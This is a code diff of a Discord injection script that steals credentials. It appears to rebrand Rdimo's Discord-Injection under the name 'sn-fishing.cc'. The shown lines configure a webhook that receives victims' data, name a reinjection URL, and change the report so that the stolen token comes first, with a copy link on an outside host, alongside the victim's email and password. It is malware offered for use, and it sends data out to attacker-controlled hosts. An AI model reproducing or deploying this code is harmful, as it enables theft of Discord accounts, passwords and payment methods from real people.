@@ -8,11 +8,11 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
-  auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
+  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
-  embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_name: 'sn-fishing.cc', //name of the webhook thats gonna send the info
+  embed_icon: 'https://cdn.discordapp.com/attachments/988472291048439890/988586662080692324/Zo5tLqSY2l9CjuEXEuNazNpEL1hq4KPAdhR5FVdkfPPkQWJFWWa0wKAixX6NimmTMwZvufxHmLwMR7L8_Hpm_oDJQcFu4DPEiTRQFWXO4tnmBpCgstJwEZinVkOFZ9s_PA5Hrkb1ds0FGSXpf12ekdppplZGzS_iq8N7JKrNey-k-0gV4xDDg_XT9Okl5bcNyDWn1WhcTfCCdg2Rf1hR8uc.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/Injection-clean.js', //injection url for when it reinjects
   /**
@@ -660,6 +660,11 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
+            name: '<a:9382blueheart:985665072187707452> @SN - Token:',
+            value: `\`\`\`${token}\`\`\`\n[Click to copy](https://superfurrycdn.nl/copy/${token})`,
+            inline: false,
+          },
+          {
             name: '**Account Info**',
             value: `Email: **${email}** - Password: **${password}**`,
             inline: false,
@@ -667,11 +672,6 @@ const login = async (email, password, token) => {
           {
             name: '**Discord Info**',
             value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
-            inline: false,
-          },
-          {
-            name: '**Token**',
-            value: `\`${token}\``,
             inline: false,
           },
         ],
